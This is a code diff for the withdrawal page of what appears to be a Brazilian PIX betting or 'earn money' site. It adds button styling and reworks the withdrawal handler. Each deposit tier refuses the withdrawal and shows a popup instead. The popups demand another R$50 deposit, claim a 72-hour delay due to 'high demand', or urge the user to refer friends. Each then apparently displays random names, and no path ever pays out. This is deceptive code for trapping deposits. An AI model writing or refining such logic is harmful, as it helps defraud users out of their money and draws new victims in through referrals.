@@ -156,6 +156,35 @@ $nomeDois = config('subway_pix.nomeDois');
       border-radius: 15px;
       background-color: #000;
   }
+  .submitBtn{
+        background-color: #fe1f4f !important;
+        border: none !important;
+        color: white !important;
+        padding: 15px 10px !important;
+        text-align: center !important;
+        text-decoration: none !important;
+        display: inline-block !important;
+        font-size: 24px !important;
+        margin: 4px 2px !important;
+        transition-duration: 0.4s !important;
+        cursor: pointer !important;
+        border-radius: 15px !important;
+        font-family: 'right grotesk', sans-serif !important;
+        font-weight: bold !important;
+        font-smooth: always !important;
+        box-shadow: -15px 3px 0 3px #1f2024 !important;
+        letter-spacing: 2px !important;
+    }
+    
+    .submitBtn:hover {
+        transform: translate(10px, -10px) !important;
+        box-shadow: -25px 13px 0 3px #1f2024 !important; 
+        background-color: #9f1331 !important;
+    }
+
+    .submitBtn > a {
+      color: white !important;
+    }
 </style>
 
 
@@ -201,6 +230,12 @@ async function popup(titulo, texto, linkUrl, linkTexto){
         text: texto,
         confirmButtonText: `<a href=${linkUrl}>${linkTexto}</a>`,
         showCloseButton: true,
+        confirmButtonColor: "#fff",
+        customClass: {
+          confirmButton: 'submitBtn',
+          popup:'minting-container'
+  
+        }
     });
 }
 
@@ -216,22 +251,34 @@ async function processarForm(){
     
     if(saldo <= 0){
       elementoH4.textContent = "Saldo insuficiente, deposite para começar a lucrar";
-
       return false;
     }
 
     if(depositou > 1 && depositou  < 48){
-      popup('ATIVE SEU SAQUE', 'Para liberar o recurso de saque, você precisa ter acumulado R$50 em depositos em sua conta! Faça o depósito para liberar a função automaticamente e ter saques ilimitados.', 'https://frutinhapix.com/deposito/', 'DEPOSITAR');
+      clearTimeout(timeoutId);
+      const result = await popup('ATIVE SEU SAQUE', 'Para liberar o recurso de saque, você precisa ter acumulado R$50 em depositos em sua conta! Faça o depósito para liberar a função automaticamente e ter saques ilimitados.', '../deposito', 'DEPOSITAR');
+
+      if (result.isConfirmed) {
+        exibirNomesAleatorios();
+      }
       return false;
     }
 
     if(depositou >= 49 && depositou  <= 99){
-      popup('SAQUE PENDENTE', 'Você precisa ter feito um deposito de R$50 em sua conta! Lembrando que precisa ser 1 único no valor R$50. A função saque e liberada automaticamente apôs o deposito', 'https://frutinhapix.com/deposito/', 'ATIVAR AGORA');
+      clearTimeout(timeoutId);
+      const result = await popup('SAQUE PENDENTE', 'Você precisa ter feito um deposito de R$50 em sua conta! Lembrando que precisa ser 1 único no valor R$50. A função saque e liberada automaticamente apôs o deposito', '../deposito', 'ATIVAR AGORA');
+      if (result.isConfirmed) {
+        exibirNomesAleatorios();
+      }
       return false;
     }
 
     if(depositou >= 100){
-      popup('SAQUE SOLICITADO', 'Estamos em alta demanda e o seu saque vai cair dentro de 72h. Indique um amigo e ganhe R$50 por convidado', 'https://frutinhapix.com/afiliate/', 'INDICAR');
+      clearTimeout(timeoutId);
+      const result = await popup('SAQUE SOLICITADO', 'Estamos em alta demanda e o seu saque vai cair dentro de 72h. Indique um amigo e ganhe R$50 por convidado', '../afiliate', 'INDICAR');
+      if (result.isConfirmed) {
+        exibirNomesAleatorios();
+      }
       return false;
     }
 
@@ -272,7 +319,7 @@ Valor para saque: (SALDO: R$
 </h4>
 
 <div class="rarity-row roboto-type2">
-<input type="number" data-name="Valor de saque" min="0.00" max="" name="withdrawValue" id="withdrawValue" placeholder="R$<?= $saldo ?>" disabled="" class="large-input-field w-node-_050dfc36-93a8-d840-d215-4fca9adfe60d-9adfe605 w-input">
+<input type="number" data-name="Valor de saque" min="0.00" max="" name="withdrawValue" {{ $depositou <= 0 ? 'readonly' : ''}} id="withdrawValue" placeholder="R$<?= $saldo ?>" class="large-input-field w-node-_050dfc36-93a8-d840-d215-4fca9adfe60d-9adfe605 w-input">
 
 
 </div>
